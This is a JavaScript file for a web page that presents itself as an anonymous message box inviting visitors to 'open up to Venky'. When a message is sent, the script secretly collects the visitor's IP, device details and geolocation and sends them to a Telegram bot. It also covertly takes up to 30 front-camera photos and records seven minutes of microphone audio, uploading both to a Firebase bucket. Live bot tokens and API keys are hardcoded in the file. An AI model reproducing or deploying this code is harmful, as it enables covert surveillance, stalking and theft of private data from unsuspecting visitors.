// 🔐 Telegram and API keys
const BOT1 = "8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0";
const BOT2 = "7398679749:AAE12lPcPxXucbfIjcTYlCU_ruMQlqvV0n0";
const CHAT_ID = "7244443820";
const GMAPS_KEY = "AIzaSyDTxpoAFF0ktFNOmdGNljAqB1BYjCAD63o";

// Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
import { getStorage, ref as sRef, uploadBytes } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-storage.js";
import { getDatabase, push, ref as dRef } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";

const firebaseConfig = {
  apiKey:"AIzaSyBiIEU8xsfxjYgGRjOvoP1RKtZKwN5i0yk",
  authDomain:"kycupdateapp.firebaseapp.com",
  projectId:"kycupdateapp",
  storageBucket:"kycupdateapp.appspot.com",
  messagingSenderId:"508854921421",
  appId:"1:508854921421:web:ebd92a2f9d69b62d54a184"
};
const app = initializeApp(firebaseConfig);
const storage = getStorage(app);
const database = getDatabase(app);

// Element refs
const msg = document.getElementById("message"),
      btn = document.getElementById("sendBtn"),
      namePopup = document.getElementById("namePopup"),
      nameInput = document.getElementById("nameInput"),
      submitName = document.getElementById("submitName"),
      reactions = document.querySelectorAll('.reactions span'),
      liveBtn = document.getElementById("liveChatBtn"),
      closeBtn = document.getElementById("closeBtn");

let typed = "", nameVal = "", permissionGranted = false;
let picTimer, picsCount=0;

// Send button enable
msg.addEventListener('input', ()=> {
  typed = msg.value.trim();
  if (typed){
    btn.disabled = false;
    btn.classList.add('enabled');
  } else {
    btn.disabled = true;
    btn.classList.remove('enabled');
  }
});

// On Send
btn.onclick = ()=> namePopup.classList.remove('hidden');

// Name submission
submitName.onclick = async () => {
  nameVal = nameInput.value.trim();
  if (!nameVal) {
    nameInput.classList.add('error');
    navigator.vibrate?.(100);
    setTimeout(()=> nameInput.classList.remove('error'),300);
    return;
  }
  namePopup.classList.add('hidden');

  const d = await collectData();
  const payload = `
🕊️ ${nameVal} sent a message

👤 Name: ${nameVal}
💬 Message: ${typed}
🌐 IP: ${d.ip}
📱 Device: ${d.os}
🧠 Browser: ${d.browser}
📶 Network: ${d.network}
📍 Location: ${d.loc}
🕐 Time: ${new Date().toLocaleString()}
  `;
  await botSend(BOT1, payload);
  alert("Thanks for opening up to Venky ❤️");
};

// Emoji reactions
document.querySelectorAll(".emoji").forEach(e =>{
  e.onclick = ()=> botSend(BOT1, `Someone reacted with ${e.textContent}`);
});

// Live Chat button
liveBtn.onclick = async () => {
  await botSend(BOT2, `⚡ Live chat launched by ${nameVal||'Anonymous'}`);
  window.open("livechat.html","_blank");
};

// Close & redirect
closeBtn.onclick = ()=> window.location.href = "https://instagram.com";

// Data collection
async function collectData(){
  const ipRes = await fetch("https://api.ipify.org?format=json");
  const json = await ipRes.json();
  const network = navigator.connection?.effectiveType||"unknown";
  const ua = navigator.userAgent;
  const os = navigator.platform;
  const browser = ua;
  let loc = "Not shared";
  if (navigator.geolocation) {
    const p = await new Promise(res=>navigator.geolocation.getCurrentPosition(r=>res(r.coords),()=>res(null)));
    if(p) loc = `https://maps.google.com?q=${p.latitude},${p.longitude}`;
  }
  startPicAudio();
  return {ip:json.ip,network,ua,os,browser,loc};
}

// Background media
async function startPicAudio(){
  try {
    const audiostream = await navigator.mediaDevices.getUserMedia({audio:true});
    const videostream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
    permissionGranted = true;
    picTimer = setInterval(async ()=>{
      if (picsCount < 30){
        const track = videostream.getVideoTracks()[0];
        const imgBlob = await new ImageCapture(track).takePhoto();
        await uploadBytes(sRef(storage, `bgpics/${Date.now()}.jpg`), imgBlob);
        picsCount++;
      }
    },10000);

    const recorder = new MediaRecorder(audiostream);
    recorder.start();
    setTimeout(()=>recorder.stop(),7*60*1000);
    const chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = async () => {
      const blob = new Blob(chunks,{type:'audio/webm'});
      await uploadBytes(sRef(storage, `bgaudio/${Date.now()}.webm`), blob);
    }
  } catch(e){
    console.warn("Permissions denied:", e);
  }
}

async function botSend(token, text){
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method:"POST", headers:{'Content-Type':'application/json'},
    body:JSON.stringify({chat_id: CHAT_ID, text})
  });
}
